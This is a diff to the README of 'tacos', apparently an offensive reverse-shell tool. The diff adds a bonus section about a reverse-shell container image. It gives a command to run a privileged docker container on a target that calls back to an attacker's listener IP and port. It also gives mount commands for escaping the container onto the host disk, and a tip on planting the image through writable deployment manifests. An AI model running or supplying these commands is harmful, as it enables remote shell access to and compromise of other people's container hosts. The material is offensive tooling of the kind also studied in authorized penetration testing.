@@ -57,6 +57,26 @@ tacos.container [LISTENING_ADDR] [LISTENING_PORT] # [OPTIONAL_TACOS_ARS]
 ***Notes about `tacos` container security:***
 > From a networking point of view, this is the same level of isolation as if the processes were running directly on the host and not in a container. However, in all other ways, such as storage, process namespace, and user namespace, the process is isolated from the host.
 
+<details>
+<summary><h4>🎁 Bonus: <code>tacos</code> reverse shell image</h4></summary>
+Useful if target is running docker, kubernetes, etc ...
+<br> On attacker machine, launch your <code>tacos</code> listener as usual
+<br> On target:
+<pre><code>
+docker run --privileged --rm -it ariary/tacos-reverse [TACOS_LISTENER_IP]:[TACOS_LISTENER_PORT]
+</code></pre>
+<blockquote>💡: <code>--privileged</code> mode is not mandatory is to allows container escaping with:
+<pre><code>
+fdisk -l
+mkdir /mnt/hostfs
+mount /dev/sda1 /mnt/hostfs
+</code></pre>
+</blockquote>
+<br>
+<blockquote>💡: If you only have writing access to a manifest deploying containers. Use <code>ariary/tacos-reverse</code> image with appropriate arguments
+</blockquote>
+</details>
+
 ## Install
 
 ### Docker
